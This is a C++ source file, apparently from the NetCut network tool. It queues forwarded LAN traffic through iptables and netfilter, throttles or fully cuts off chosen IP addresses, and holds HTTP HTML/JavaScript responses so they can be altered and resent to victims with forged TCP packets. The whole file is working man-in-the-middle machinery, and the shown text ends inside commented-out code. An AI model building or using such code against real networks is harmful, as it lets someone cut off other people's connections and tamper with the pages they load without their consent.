/*
 * CPacketFilter.cpp
 *
 *  Created on: Mar 30, 2016
 *      Author: root
 */

#include "CPacketFilter.h"
#include "CAddressHelper.h"
#include <CZlib.h>

namespace NETCUT_CORE_FUNCTION {

CPacketFilter::CPacketFilter() {
	// TODO Auto-generated constructor stub
	m_nQueuenumber = 0;
	m_fd = 0;
	m_h=0;
	m_qh=0;
	m_bIPForwardValue = ::GetIpforward();
	m_bHasData = false;
}

CPacketFilter::~CPacketFilter() {
	// TODO Auto-generated destructor stub

	this->m_ExitEvent.SetEvent(IOWATCHER_ID_EXIT);
	RemoveOldQueue();
	EnableIpforward(m_bIPForwardValue);

	//TRACE("Waitting Queue binding thread finish\n");
	m_ThreadHandleQueueBinding.WaitThreadExit();

	if (m_fd!=0) {
		//close(m_fd);
		shutdown(m_fd, SHUT_RDWR);
	//	TRACE("Closing file handle\n");
	}

	if (m_qh!=0) {
		nfq_destroy_queue(m_qh);
		m_qh = NULL;

	}

	if (m_h) {
		//TRACE("closing netfilter queue handle\n");
		nfq_close(m_h);
		m_h = NULL;
	}




//	TRACE("FIlter finish\n");
}

bool CPacketFilter::setupQueue() {

/*
    TRACE("No Filter here in this test\n");
	 return false;
*/

	m_h = nfq_open();
	if (!m_h) {
		TRACE("Failed to bind queue\n");
		return false;
	}
	if (nfq_unbind_pf(m_h, AF_INET) < 0) {
		TRACE("error during nfq_unbind_pf()\n");
		return false;
	}

	if (nfq_bind_pf(m_h, AF_INET) < 0) {
		TRACE("error during nfq_bind_pf()\n");
		return false;
	}

	if (!CreateQueue(this->m_nQueuenumber)) {
		TRACE("Can NOT create IP Queue, use weak protection\n");
	//	return false;
	}

	//TRACE("Try not setup queue see where the problem goes\n");
	//return false; //No packet filter for now

	m_qh = nfq_create_queue(m_h, this->m_nQueuenumber, &cb, this);
	if (!m_qh) {

		TRACE("Can't bind queue\n");
		return false;
	}

	TRACE("Bind queue OK\n");

//	printf("setting copy_packet mode\n");
	if (nfq_set_mode(m_qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
		TRACE("can't set packet_copy mode\n");
		return false;
	}

	struct nfq_q_handle *qh;
	struct nfnl_handle *nh;

	m_fd = nfq_fd(m_h);

	m_ThreadHandleQueueBinding.StartThread(threadBindQueue, this);

	return true;
}

void* CPacketFilter::threadBindQueue(void *para) {
	CPacketFilter *n = (CPacketFilter *) para;
	n->threadBindQueueRun();
	return 0;
}

void CPacketFilter::RemoveOldQueue() {

	string iptables = CAddressHelper::getAppPath() + "iptables";
	for (int i = 0; i < 1; i++) {
		char buf[255];
		/*	memset(buf, 0, 255);
		 sprintf(buf,
		 "%s -t mangle -D PREROUTING -j NFQUEUE --queue-num %d --queue-bypass",
		 iptables.c_str(), i);
		 iptables_commands(buf);
		 memset(buf, 0, 255);
		 sprintf(buf,
		 "%s -t mangle -D POSTROUTING -j NFQUEUE --queue-num %d --queue-bypass",
		 iptables.c_str(), i);
		 iptables_commands(buf);
		 */
		memset(buf, 0, 255);
	/*	sprintf(buf, "%s  -D FORWARD -j NFQUEUE --queue-num %d --queue-bypass",
				iptables.c_str(), i); */

		sprintf(buf, "%s  -D FORWARD -j NFQUEUE --queue-num %d",
					iptables.c_str(), i);
		iptables_commands(buf);

	}
}

bool CPacketFilter::CreateQueue(int p_nQueueNumber) {

//	string iptables = CAddressHelper::getAppPath() + "iptables";

	RemoveOldQueue();
	string iptables ="iptables";

	char buf[255];
	/*memset(buf, 0, 255);

	 sprintf(buf,
	 "%s -t mangle -A POSTROUTING -j NFQUEUE --queue-num %d --queue-bypass",
	 iptables.c_str(), p_nQueueNumber);
	 bool bRet1 = iptables_commands(buf);

	 memset(buf, 0, 255);
	 sprintf(buf,
	 "%s -t mangle -A PREROUTING  -j NFQUEUE --queue-num %d --queue-bypass",
	 iptables.c_str(), p_nQueueNumber);
	 bool bRet2 = iptables_commands(buf);

	 */
	memset(buf, 0, 255);

	//sprintf(buf, "%s -A FORWARD -j NFQUEUE --queue-num %d --queue-bypass", iptables.c_str(), p_nQueueNumber);
	sprintf(buf, "%s -I FORWARD -j NFQUEUE --queue-num %d", iptables.c_str(),
			p_nQueueNumber);

	bool bRet3 = iptables_commands(buf);

	//return (bRet1 && bRet2 && bRet3);
	return bRet3;

}
bool CPacketFilter::IsNeededHTTPResponse(std::string & p_sResponse,
		bool & p_bHTML, bool & p_bGzip, bool & p_bChunked,
		unsigned int & p_nContentLen) //-1 no need 1 html 0 js
		{
	p_bHTML = true;
	p_bGzip = false;
	p_bChunked = false;
	p_nContentLen = 0;
	if (p_sResponse.size() < 20)
		return false;
	string stat = p_sResponse.substr(0, 17);
	if (stat != "HTTP/1.1 200 OK\r\n")
		return false;

	if (p_sResponse.find("\r\nContent-Type: text/javascript") == string::npos
			&& p_sResponse.find("\r\nContent-Type: application/x-javascript")
					== string::npos
			&& p_sResponse.find("\r\nContent-Type: application/javascript")
					== string::npos
			&& p_sResponse.find("\r\nContent-Type: text/html") == string::npos)
		return false;

	int nPos = p_sResponse.find("\r\nContent-Length: ");
	if (nPos != string::npos) {
		nPos += 18; //move pos to where length number start
		int nPosEnd = p_sResponse.find("\r\n", nPos);
		string slen = p_sResponse.substr(nPos, nPosEnd - nPos);
		p_nContentLen = atoi(slen.c_str());
		if (p_nContentLen > MAXHTTPDATA_BUFF_SIZE) {
			TRACE("TOO much data %d to buffer, give up\n", p_nContentLen);
			return false; //can not handle this much data
		}
	}

	if (p_sResponse.find("\r\nTransfer-Encoding: chunked") != string::npos) {
		p_bChunked = true;
	}

	if (p_sResponse.find("\r\nContent-Encoding: gzip") != string::npos) {
		p_bGzip = true;
	}

	if (p_bChunked && p_nContentLen > 0)
		return false; //Chunked and content length can not be together

	if (!p_bChunked && p_nContentLen == 0)
		return false;  // not knowing a connection data size, impossiable to use

	if (p_sResponse.find("\r\nContent-Type: text/javascript") != string::npos
			|| p_sResponse.find("\r\nContent-Type: application/javascript")
					!= string::npos
			|| p_sResponse.find("\r\nContent-Type: application/x-javascript")
					!= string::npos)
		p_bHTML = false;

	return true;

}

bool CPacketFilter::IsServerDataLoaded(struct connectionvalue & p_connbuff) {

	bool bFinish = false;
	if (p_connbuff.bChunked && p_connbuff.nHeaderSize > 0
			&& p_connbuff.nBufferedSize > p_connbuff.nHeaderSize
			&& IsChunkedFinish(p_connbuff.payload, p_connbuff.nBufferedSize)) {
		bFinish = true;
	}
	if (p_connbuff.nContentLen > 0 && p_connbuff.nHeaderSize > 0
			&& (p_connbuff.nBufferedSize - p_connbuff.nHeaderSize)
					== p_connbuff.nContentLen) {

	/*	TRACE("Seems all loaded Con-len: %d, server %d ",
				p_connbuff.nContentLen,
				(p_connbuff.nBufferedSize - p_connbuff.nHeaderSize));
				*/

		bFinish = true;

	}

	return bFinish;
}

bool CPacketFilter::IsDataTooBig(unsigned int p_nDataSize,
		struct connectionvalue & p_connbuff) {

	if (p_connbuff.nContentLen > 0 && p_connbuff.nHeaderSize > 0) {
		if (p_connbuff.nBufferedSize + p_nDataSize
				> (p_connbuff.nContentLen + p_connbuff.nHeaderSize))
			return true;
	}

	if (p_connbuff.nBufferedSize + p_nDataSize > MAXHTTPDATA_BUFF_SIZE)
		return true;

	return false;

}
bool CPacketFilter::IsBrowserOK(std::string & p_sAgent) {
	if (p_sAgent.find("Chrome") != string::npos)
		return true;

	if (p_sAgent.find("Browser") != string::npos)
		return true;

	if (p_sAgent.find("Opera") != string::npos)
		return true;

	if (p_sAgent.find("Firefox") != string::npos)
		return true;

	if (p_sAgent.find("Safari") != string::npos)
		return true;

	if (p_sAgent.find("Internet Explorer") != string::npos)
		return true;

	return false;
}

bool CPacketFilter::IsExtOK(std::string & p_sFile) {
	if (p_sFile == "")
		return true;
	if (p_sFile == "php")
		return true;

	if (p_sFile == "htm")
		return true;
	if (p_sFile == "html")
		return true;
	if (p_sFile == "shtml")
		return true;
	if (p_sFile == "js")
		return true;

	return false;

}

u_int32_t CPacketFilter::Packethandler(struct nfq_q_handle * qh,
		struct nfq_data *tb) {

	int id = 0;
	struct nfqnl_msg_packet_hdr *ph;
	struct nfqnl_msg_packet_hw *hwph;
	u_int32_t mark, ifi;
	int nDataSize;
	unsigned char *data;

	ph = nfq_get_msg_packet_hdr(tb);

	if (!ph) {
		TRACE("bad packet");
		return 0;
	}

	/*
	 hwph = nfq_get_packet_hw(tb);
	 if (!hwph) {
	 TRACE("bad packet NO HARDWARE INFO");
	 return 0;
	 int i, hlen = ntohs(hwph->hw_addrlen);

	 printf("hw_src_addr=");
	 for (i = 0; i < hlen-1; i++)
	 printf("%02x:", hwph->hw_addr[i]);
	 printf("%02x ", hwph->hw_addr[hlen-1]);
	 }
	 */
	id = ntohl(ph->packet_id);

	nDataSize = nfq_get_payload(tb, &data);

	int nRetCode = NF_ACCEPT;
	do {
		if (nDataSize < sizeof(sniff_ip))
			break;

		const struct sniff_ip *ip; /* The IP header */
		ip = (struct sniff_ip*) (data);
		int size_ip = IP_HL(ip) * 4;

		if (nDataSize < size_ip + sizeof(tcp_header))
			break;

		nRetCode = OnIPRedirectControl(ip, nDataSize);
		if (nRetCode == NF_DROP)
			break;
		bool bNeedPacketFilter = false;
		nRetCode = OnIPSpeedControl(ip, nDataSize, bNeedPacketFilter);
		if (nRetCode == NF_DROP && !bNeedPacketFilter)
			break;

		if (ip->ip_p == IPPROTO_TCP && bNeedPacketFilter) {

			//		TRACE("HOOK %d\n", ph->hook);
			nRetCode = OnIPPacketFilter(ip, nDataSize);
		}

	} while (false);
	// TRACE("Rule %d Packet Size %d SRC IP %s, DST IP %s\n",ph->hook,nDataSize,CAddressHelper::IntIP2str(ip->ip_src.s_addr).c_str(),CAddressHelper::IntIP2str(ip->ip_dst.s_addr).c_str());

	return nfq_set_verdict(qh, id, nRetCode, nDataSize, data);
}

void CPacketFilter::GetHTTPConnection(const struct sniff_ip * p_IPBuffer,
		httpconnection& p_connection) {

	const struct tcp_header * tcp = (struct tcp_header *) ((u_char*) p_IPBuffer
			+ IP_HL(p_IPBuffer) * 4);

	/*TRACE("SRC IP %s, DST IP %s src tcp %d dst tcp %d window %d\n",
	 CAddressHelper::IntIP2str(p_IPBuffer->ip_src.s_addr).c_str(),
	 CAddressHelper::IntIP2str(p_IPBuffer->ip_dst.s_addr).c_str(),
	 ntohs(tcp->source_port), ntohs(tcp->dest_port),tcp->window);
	 */
	struct connection * n = (struct connection *) &p_connection;
	if (ntohs(tcp->source_port) == 80) {
		memcpy(n, &p_IPBuffer->ip_src, sizeof(p_IPBuffer->ip_src) * 2);
		memcpy(&n->tcp_sport, &tcp->source_port, sizeof(tcp->source_port) * 2);

		/*	TRACE("Server made Connection SRC IP %s, DST IP %s src tcp %d dst tcp %d\n",
		 CAddressHelper::IntIP2str(n->ip_src.s_addr).c_str(),
		 CAddressHelper::IntIP2str(n->ip_dst.s_addr).c_str(),
		 ntohs(n->tcp_sport), ntohs(n->tcp_dport));
		 */
	} else {
		memcpy(n, &p_IPBuffer->ip_dst, sizeof(p_IPBuffer->ip_dst));
		memcpy(&n->ip_dst, &p_IPBuffer->ip_src, sizeof(p_IPBuffer->ip_src));
		memcpy(&n->tcp_sport, &tcp->dest_port, sizeof(tcp->dest_port));
		memcpy(&n->tcp_dport, &tcp->source_port, sizeof(tcp->source_port));
		/*	TRACE("Client Made Connection SRC IP %s, DST IP %s src tcp %d dst tcp %d\n",
		 CAddressHelper::IntIP2str(n->ip_src.s_addr).c_str(),
		 CAddressHelper::IntIP2str(n->ip_dst.s_addr).c_str(),
		 ntohs(n->tcp_sport), ntohs(n->tcp_dport));
		 */
	}

}

bool CPacketFilter::GetIsFilterData() {
	bool bRet = false;
	m_lock.lock();
	bRet = this->m_bHasData;

	m_lock.unlock();

	return bRet;
}
void CPacketFilter::SetFileterData(std::string p_sDataStr) {

	m_lock.lock();
	this->m_bHasData = true;
	this->m_sDataStr = p_sDataStr;

	//TRACE("Got filter data %s\n",m_sDataStr.c_str());

	m_lock.unlock();

}
void CPacketFilter::SetDevName(std::string p_sName) {
	CPacketSender::SetDevName(p_sName);

	EnableIpforward(true); //enable ip foward
	EnableRedirect(this->m_sDevName, false);

	setupQueue();
}

bool CPacketFilter::HandleServerPacket(const struct sniff_ip * p_IPBuffer,
		int p_nBufSize, struct connectionvalue & p_connbuff) {

	int size_ip = IP_HL(p_IPBuffer) * 4;

	const struct tcp_header * tcp = (struct tcp_header *) ((u_char*) p_IPBuffer
			+ IP_HL(p_IPBuffer) * 4);

	u_char * tcppayloadbegin = ((u_char*) p_IPBuffer + size_ip
			+ tcp->data_offset * 4);

	int tcppayloadsize = p_nBufSize - tcp->data_offset * 4 - size_ip;

	char mymac[6];
	char dstmac[6];
	if (!GetMyMac(mymac) || !GetMacofDstIP(p_IPBuffer->ip_src.s_addr, dstmac)) {
		TRACE("No Gate MAC found yet\n");
		return false;
	}
	/*
	 ACK HANDLE
	 IF FINSERVER. DO NOTHING
	 ACK WITH KNOWN DATA GOT. STORE NEW DATA, RECORD LAST HANDLE TIMER.
	 IF CHUNKED, MANGLE DATA, SEND DATA to client, mark finish when CHUNKED FINISH
	 IF CONTENT LEN and finish, MANGL, SEND DATA TO CLIENT, mark finish
	 MARK FINISH SERVER, SEND FIN,ACK to server.

	 FIN HANDLE
	 */
	bool bFinish = false;

	if (tcp->ack && !p_connbuff.bFinServer) {
		if (ntohl(tcp->sequence) == p_connbuff.nLastAck2Server) {

			if (IsDataTooBig(tcppayloadsize, p_connbuff))
				return false;

			memcpy((char *) (p_connbuff.payload + p_connbuff.nBufferedSize),
					tcppayloadbegin, tcppayloadsize);

			p_connbuff.nBufferedSize += tcppayloadsize;
			p_connbuff.nLastAck2Server = ntohl(tcp->sequence) + tcppayloadsize;
			p_connbuff.nLastSeq2Server = ntohl(tcp->acknowledge);

			if (p_connbuff.nHeaderSize == 0)
				p_connbuff.nHeaderSize = GetHeaderSize(p_connbuff.payload);

			bFinish = IsServerDataLoaded(p_connbuff);

		}

		this->sendTCP((const unsigned char *) mymac,
				(const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
				p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
				ntohs(tcp->source_port), p_connbuff.nLastSeq2Server,
				p_connbuff.nLastAck2Server, TH_ACK, NULL, 0);

	}

	if (tcp->fin) //Server start fin him self, need to ack ++
	{
		bFinish = true;
		p_connbuff.nLastAck2Server = ntohl(tcp->sequence) + tcppayloadsize + 1;
		p_connbuff.nLastSeq2Server = ntohl(tcp->acknowledge);
	//	TRACE("Server %s FIN packet got, I will response FIN/ACK+1 \n",	p_connbuff.filename);

		this->sendTCP((const unsigned char *) mymac,
				(const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
				p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
				ntohs(tcp->source_port), p_connbuff.nLastSeq2Server,
				p_connbuff.nLastAck2Server, TH_ACK, NULL, 0);
	}

	if (bFinish && !p_connbuff.bFinServer) // Send FIN packet to server to finish it. mangle payload, send to client
			{
		//TRACE("Got all server data sending to client now %s\n",p_connbuff.filename);
		p_connbuff.bFinServer = true;
		this->sendTCP((const unsigned char *) mymac,
				(const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
				p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
				ntohs(tcp->source_port), p_connbuff.nLastSeq2Server,
				p_connbuff.nLastAck2Server, TH_ACK | TH_FIN, NULL, 0);
	}

	char clientmac[6];
	if (!GetMacofDstIP(p_IPBuffer->ip_dst.s_addr, clientmac))
		return false; // can't find client mac

	//if (p_connbuff.bFinServer || (p_connbuff.bChunked&&!p_connbuff.bGzip) ){

	if (p_connbuff.bFinServer) {

		manglepacket(p_connbuff);  //Now send packet to clients
	//	TRACE("Sending changed content\n");
		int nbuffersize = 1344;

		nbuffersize =
				nbuffersize
						< (p_connbuff.nBufferedSize
								- p_connbuff.nDataLastSentIndex) ?
						nbuffersize :
						p_connbuff.nBufferedSize
								- p_connbuff.nDataLastSentIndex;

		if (nbuffersize <= 0)
			return true;  //No need to send

		this->sendTCP((const unsigned char *) mymac,
				(const unsigned char *) clientmac, p_IPBuffer->ip_src.s_addr,
				p_IPBuffer->ip_dst.s_addr, ntohs(tcp->source_port),
				ntohs(tcp->dest_port), p_connbuff.nLastSeq2Client,
				p_connbuff.nLastAck2Client,
				TH_ACK,
				(unsigned char *) p_connbuff.payload
						+ p_connbuff.nDataLastSentIndex, nbuffersize);

		p_connbuff.nDataLastSentIndex += nbuffersize;

		/*	while(p_connbuff.nDataLastSentIndex<p_connbuff.nBufferedSize)
		 {
		 nbuffersize =
		 nbuffersize
		 < (p_connbuff.nBufferedSize
		 - p_connbuff.nDataLastSentIndex) ?
		 nbuffersize :
		 p_connbuff.nBufferedSize
		 - p_connbuff.nDataLastSentIndex;

		 if (nbuffersize <= 0)
		 return true;  //No need to send

		 this->sendTCP((const unsigned char *) mymac,
		 (const unsigned char *) clientmac, p_IPBuffer->ip_src.s_addr,
		 p_IPBuffer->ip_dst.s_addr, ntohs(tcp->source_port),
		 ntohs(tcp->dest_port), p_connbuff.nLastSeq2Client,
		 p_connbuff.nLastAck2Client,
		 TH_ACK, (unsigned char *) p_connbuff.payload+ p_connbuff.nDataLastSentIndex, nbuffersize);

		 p_connbuff.nDataLastSentIndex += nbuffersize;

		 }
		 */
	}

	return true;

}
/*
 *
 * ACK HANDLE
 IF FINCLIENT. DO NOTHING
 IF ACK DATA samller than last known ACK, SEND with last known ACK .
 If ACK data is >= last known ACK, change last known ACK to new ACK, and send data from last known ACK.
 IF all data has been send (BufferIndex) or (CHUNKED FINISHED && BufferSize) , FIN,ACK to client.
 FIN HANDLE
 ACK
 */

unsigned long long CPacketFilter::GetIPData(const DWORD & p_nIP) {

	unsigned long long n = 0;
	m_lock.lock();
	if (this->m_SpeedControl.find(p_nIP) != m_SpeedControl.end()) {
		n = m_SpeedControl[p_nIP].nTotalBytes;
	}
	m_lock.unlock();

	return n;
}

void CPacketFilter::SetIPCufOff(const DWORD & p_nIP, const bool & p_bOff) {

	if (p_bOff)
		SetIPSpeed(p_nIP, NETCUT_SPEEDLIMIT_CUTOFF);
	else
		SetIPSpeed(p_nIP, NETCUT_SPEEDLIMIT_UNLIMIT);

}
void CPacketFilter::SetIPSpeed(const DWORD & p_nIP, const int & p_nSpeedLimit) {
	//0 no limit 1, 20mb, 2, 1mb, 3, 128k, 4,16k 5, 2k

	unsigned long long nKByePerSecond;
	switch (p_nSpeedLimit) {
	case NETCUT_SPEEDLIMIT_CUTOFF: {
		nKByePerSecond = 0;  //
		break;
	}
	case NETCUT_SPEEDLIMIT_25: {
		nKByePerSecond = 1024 * 36;  //36kb,
		break;
	}
	case NETCUT_SPEEDLIMIT_50: {
		nKByePerSecond = 256 * 1024;  //256kb
		break;
	}
	case NETCUT_SPEEDLIMIT_75: {
		nKByePerSecond = 1024 * 5 * 1024;  //5M, modem
		break;
	}
	case NETCUT_SPEEDLIMIT_UNLIMIT: {
		nKByePerSecond = 1024 * 1024 * 1024;  // 1GB
		break;
	}
	default: {
		nKByePerSecond = 1024 * 1024 * 1024;  //1G
		break;

	}
	}

	m_lock.lock();
	if (this->m_SpeedControl.find(p_nIP) == m_SpeedControl.end()) {
		memset(&m_SpeedControl[p_nIP], 0, sizeof(speedlimit));
	}

	m_SpeedControl[p_nIP].nMaxBytePerSecond = nKByePerSecond;
	m_SpeedControl[p_nIP].nLastDataMangleTime = ::_helper_GetTimeSeconds()
			- MANGLEWAITTIMESECONDS + (rand() % MANGLE_FIST_WAITTIMESECONDS);
/*
	m_SpeedControl[p_nIP].nLastDataMangleTime = ::_helper_GetTimeSeconds()
			- MANGLEWAITTIMESECONDS + (rand() % 1);
*/
	m_lock.unlock();


}
bool CPacketFilter::HandleClientPacket(const struct sniff_ip * p_IPBuffer,
		int p_nBufSize, struct connectionvalue & p_connbuff) {

	int size_ip = IP_HL(p_IPBuffer) * 4;

	const struct tcp_header * tcp = (struct tcp_header *) ((u_char*) p_IPBuffer
			+ IP_HL(p_IPBuffer) * 4);

	u_char * tcppayloadbegin = ((u_char*) p_IPBuffer + size_ip
			+ tcp->data_offset * 4);

	int tcppayloadsize = p_nBufSize - tcp->data_offset * 4 - size_ip;

	char mymac[6];
	char dstmac[6];
	if (!GetMyMac(mymac) || !GetMacofDstIP(p_IPBuffer->ip_src.s_addr, dstmac)) {
	//	TRACE("No Gate MAC found yet\n");
		return false;
	}

	/*TRACE(
			"Got client  %s packet ack %u seq %u size %d Last confirmed ACK is %u \n",
			p_connbuff.filename, ntohl(tcp->acknowledge), ntohl(tcp->sequence),
			tcppayloadsize, p_connbuff.nConfirmedClientACK);
*/
	if (tcp->ack && !p_connbuff.bFinClient) {
		p_connbuff.nConfirmedClientACK =
				ntohl(tcp->acknowledge) > p_connbuff.nConfirmedClientACK ?
						ntohl(tcp->acknowledge) :
						p_connbuff.nConfirmedClientACK;
		p_connbuff.nLastAck2Client = ntohl(tcp->sequence) + tcppayloadsize;
		p_connbuff.nLastSeq2Client = p_connbuff.nConfirmedClientACK;

		int nDataOffset = p_connbuff.nLastSeq2Client - p_connbuff.nDataBeginSeq;

		if (nDataOffset < p_connbuff.nBufferedSize) {
			int nSendBuffer = p_connbuff.nBufferedSize - nDataOffset;
			if (nSendBuffer > 1344)
				nSendBuffer = 1344;
			this->sendTCP((const unsigned char *) mymac,
					(const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
					p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
					ntohs(tcp->source_port), p_connbuff.nLastSeq2Client,
					p_connbuff.nLastAck2Client,
					TH_ACK, (unsigned char *) p_connbuff.payload + nDataOffset,
					nSendBuffer);
/*
			TRACE(
					"Send PACKET to client ack %u seq %u %s data size %d of remaining %d\n",
					p_connbuff.nLastAck2Client, p_connbuff.nLastSeq2Client,
					p_connbuff.filename, nSendBuffer,
					p_connbuff.nBufferedSize - nDataOffset);
*/
			if (nDataOffset + nSendBuffer == p_connbuff.nBufferedSize) {
				this->sendTCP((const unsigned char *) mymac,
						(const unsigned char *) dstmac,
						p_IPBuffer->ip_dst.s_addr, p_IPBuffer->ip_src.s_addr,
						ntohs(tcp->dest_port), ntohs(tcp->source_port),
						p_connbuff.nLastSeq2Client + nSendBuffer,
						p_connbuff.nLastAck2Client,
						TH_ACK | TH_FIN,
						NULL, 0);
				p_connbuff.bFinClient = true;

/*				TRACE("Send FIN PACKET to client ack %u seq %u %s data\n",
						p_connbuff.nLastAck2Client, p_connbuff.nLastSeq2Client,
						p_connbuff.filename, nSendBuffer,
						p_connbuff.nBufferedSize - nDataOffset);
			*/
			}
		} else {
			p_connbuff.bFinClient = true;
		/*	TRACE(
					"ALl data sent out ,Send FIN PACKET to client ack %u seq %u %s\n",
					p_connbuff.nLastAck2Client, p_connbuff.nLastSeq2Client,
					p_connbuff.filename);
*/
			this->sendTCP((const unsigned char *) mymac,
					(const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
					p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
					ntohs(tcp->source_port), p_connbuff.nLastSeq2Client,
					p_connbuff.nLastAck2Client,
					TH_ACK | TH_FIN,
					NULL, 0);

		}
	}
	if (tcp->ack && !tcp->fin && p_connbuff.bFinClient) {

		this->sendTCP((const unsigned char *) mymac,
				(const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
				p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
				ntohs(tcp->source_port), p_connbuff.nLastSeq2Client,
				p_connbuff.nLastAck2Client,
				TH_ACK | TH_FIN,
				NULL, 0);
	}
	if (tcp->fin) {
		p_connbuff.bFinClient = true;
/*		TRACE("Got client packet FIN PACKET ack %u seq %u %s\n",
				ntohl(tcp->acknowledge), ntohl(tcp->sequence),
				p_connbuff.filename);
*/
		p_connbuff.nLastAck2Client = ntohl(tcp->sequence) + tcppayloadsize + 1;
		p_connbuff.nLastSeq2Client = ntohl(tcp->acknowledge);
	//	TRACE("Client FIN packet got, I will response FIN/ACK+1 \n");

		this->sendTCP((const unsigned char *) mymac,
				(const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
				p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
				ntohs(tcp->source_port), p_connbuff.nLastSeq2Client,
				p_connbuff.nLastAck2Client, TH_ACK,
				NULL, 0);

		SetIPPacketFilterTimeStamp(p_IPBuffer->ip_src.s_addr);
		return false; // tell caller this is done. can be removed

	}

	return true;

}

/*
 * if handler don't understand the packet, simply return and remove the connection.
 handler must set one bit in tcp to identify it's no more DROP.


 if src 80,  response this packet tile all content finish
 if dst 80,  response packet with data (if any, otherwise, response with empty data)

 bool Server Handle
 ACK HANDLE
 IF FINSERVER. DO NOTHING
 ACK WITH KNOWN DATA GOT. STORE NEW DATA, RECORD LAST HANDLE TIMER.
 IF CHUNKED, MANGLE DATA, SEND DATA to client, mark finish when CHUNKED FINISH
 IF CONTENT LEN and finish, MANGL, SEND DATA TO CLIENT, mark finish
 MARK FINISH SERVER, SEND FIN,ACK to server.

 FIN HANDLE
 ACK
 bool Client Handle
 ACK HANDLE
 IF FINCLIENT. DO NOTHING
 IF ACK DATA samller than last known ACK, SEND with last known ACK .
 If ACK data is >= last known ACK, change last known ACK to new ACK, and send data from last known ACK.
 IF all data has been send (BufferIndex) or (CHUNKED FINISHED && BufferSize) , FIN,ACK to client.
 FIN HANDLE
 ACK
 */

bool CPacketFilter::HTTPHandler(const struct sniff_ip * p_IPBuffer,
		int p_nBufSize, struct connectionvalue & p_connbuff) {

	int size_ip = IP_HL(p_IPBuffer) * 4;

	const struct tcp_header * tcp = (struct tcp_header *) ((u_char*) p_IPBuffer
			+ size_ip);

	if (ntohs(tcp->source_port) == 80) {

		return this->HandleServerPacket(p_IPBuffer, p_nBufSize, p_connbuff);
	}
	if (ntohs(tcp->dest_port) == 80) {

		return this->HandleClientPacket(p_IPBuffer, p_nBufSize, p_connbuff);

	}

	return true;
}

/*
 bool CPacketFilter::HTTPHandler(const struct sniff_ip * p_IPBuffer,
 int p_nBufSize, struct connectionvalue & p_connbuff) {


 int size_ip = IP_HL(p_IPBuffer) * 4;

 const struct tcp_header * tcp = (struct tcp_header *) ((u_char*) p_IPBuffer
 + size_ip);

 u_char * tcppayloadbegin = ((u_char*) p_IPBuffer + size_ip
 + tcp->data_offset * 4);

 int tcppayloadsize = p_nBufSize - tcp->data_offset * 4 - size_ip;

 if (ntohs(tcp->source_port) == 80) {
 //  Get SEQ, Compare to last ACK , if SEQ == Last ACK, copy data of this packet into buffer at index [this seq - first seq]
 //                                ACK SEQ + Data, record last ack.
 //   if SEQ > LAST ACK, resend last ACK.
 //if SEQ < Lask ACK, resend last ack
 // 	 if total data recieved reach to content-length||CHUNK FINISH, send FIN packet/Mark FIN packet
 // if SERVER FINISHED processing, ONLY RESPONSE FIN PACKET

 char mymac[6];
 char dstmac[6];
 if (!GetMyMac(mymac)
 || !GetMacofDstIP(p_IPBuffer->ip_src.s_addr, dstmac)) {
 TRACE("No Gate MAC found yet\n");
 return false;
 }

 bool bFinish = false;

 if (!p_connbuff.bFinServer) {

 if (ntohl(tcp->sequence) == p_connbuff.nLastAck2Server) {

 if (IsDataTooBig(tcppayloadsize, p_connbuff))
 return false;

 memcpy((char *) (p_connbuff.payload + p_connbuff.nBufferedSize),
 tcppayloadbegin, tcppayloadsize);

 p_connbuff.nBufferedSize += tcppayloadsize;
 p_connbuff.nLastAck2Server = ntohl(tcp->sequence)
 + tcppayloadsize;
 p_connbuff.nLastSeq2Server = ntohl(tcp->acknowledge);
 if (p_connbuff.nHeaderSize == 0)
 p_connbuff.nHeaderSize = GetHeaderSize(p_connbuff.payload);

 }

 this->sendTCP((const unsigned char *) mymac,
 (const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
 p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
 ntohs(tcp->source_port), p_connbuff.nLastSeq2Server,
 p_connbuff.nLastAck2Server, TH_ACK, NULL, 0);

 bFinish = IsServerDataLoaded(p_connbuff);

 }

 if (tcp->fin) //Server start fin him self, need to ack ++
 {
 bFinish = true;
 p_connbuff.nLastAck2Server = ntohl(tcp->sequence) + tcppayloadsize
 + 1;
 p_connbuff.nLastSeq2Server = ntohl(tcp->acknowledge);
 TRACE("Server %s FIN packet got, I will response FIN/ACK+1 \n",
 p_connbuff.filename);

 this->sendTCP((const unsigned char *) mymac,
 (const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
 p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
 ntohs(tcp->source_port), p_connbuff.nLastSeq2Server,
 p_connbuff.nLastAck2Server, TH_ACK, NULL, 0);
 }

 if (bFinish && !p_connbuff.bFinServer) // Send FIN packet to server to finish it. mangle payload, send to client
 {
 TRACE("Got all server data sending to client now %s\n",
 p_connbuff.filename);
 p_connbuff.bFinServer = true;
 this->sendTCP((const unsigned char *) mymac,
 (const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
 p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
 ntohs(tcp->source_port), p_connbuff.nLastSeq2Server,
 p_connbuff.nLastAck2Server, TH_ACK | TH_FIN, NULL, 0);

 char clientmac[6];
 if (!GetMacofDstIP(p_IPBuffer->ip_dst.s_addr, clientmac))
 return false; // can't find client mac

 manglepacket(p_connbuff);  //Now send packet to clients
 TRACE("Sending changed content\n");
 int nlastindex = 0, nbuffersize = 1024;

 nbuffersize =
 nbuffersize < (p_connbuff.nBufferedSize - nlastindex) ?
 nbuffersize : p_connbuff.nBufferedSize - nlastindex;

